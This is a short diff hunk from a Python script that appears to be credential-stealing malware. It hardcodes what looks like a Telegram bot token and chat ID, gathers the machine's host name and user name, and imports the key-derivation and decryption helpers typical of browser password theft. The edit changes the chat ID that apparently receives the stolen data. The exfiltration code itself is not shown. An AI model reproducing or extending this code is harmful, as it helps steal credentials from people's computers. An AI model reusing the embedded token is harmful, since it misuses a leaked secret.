@@ -7,7 +7,7 @@ from hashlib import sha1, pbkdf2_hmac
 from Crypto.Util.Padding import unpad 
 from base64 import b64decode
 apibot1='6790875951:AAFh4om41W4ma1gF5rd0CIfm2ljN1I5oZUQ'
-id1 = "-6790875951"
+id1 = "-4008548854"
 
 hostname = os.getenv("COMPUTERNAME")
 usernamex = os.getlogin()
